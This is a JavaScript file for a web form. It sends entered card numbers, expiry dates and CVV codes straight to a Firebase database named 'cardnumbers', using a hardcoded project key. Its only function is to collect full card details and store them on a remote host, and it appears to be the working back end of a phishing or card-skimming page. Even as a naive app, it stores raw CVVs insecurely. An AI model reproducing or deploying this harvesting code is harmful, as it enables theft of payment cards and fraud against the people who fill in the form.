var config = {
    apiKey: "AIzaSyA63jlM1QxGOllkBtVypM2P3OzV_Z2MlfE",
    authDomain: "cardnumbers-5e6b6.firebaseapp.com",
    databaseURL: "https://cardnumbers-5e6b6-default-rtdb.firebaseio.com",
    projectId: "cardnumbers-5e6b6",
    storageBucket: "cardnumbers-5e6b6.appspot.com",
    messagingSenderId: "881486899966",
    appId: "1:881486899966:web:8fa88a8728d4cf013b13af",
    measurementId: "G-PZDE977Q01"
};

firebase.initializeApp(config);

const database = firebase.database();


function send(){
    let cardnum = document.getElementById("cardNumber").value
    let month = document.getElementById("month").value
    let year = document.getElementById("year").value
    let cvv = document.getElementById("cvv").value

    if(cardnum && month && year && cvv){
        console.log("Send")
        database.ref('/').push({
            cardNumber: cardnum,
            cardMonth: month,
            cardYear: year,
            cardCvv: cvv
        });
        reset();
    }else{
        alert('Заполните все поля!')
    }
    
}

function reset(){
    document.getElementById("cardNumber").value = ""
    document.getElementById("month").value = "01"
    document.getElementById("year").value = "2021"
    document.getElementById("cvv").value = ""
}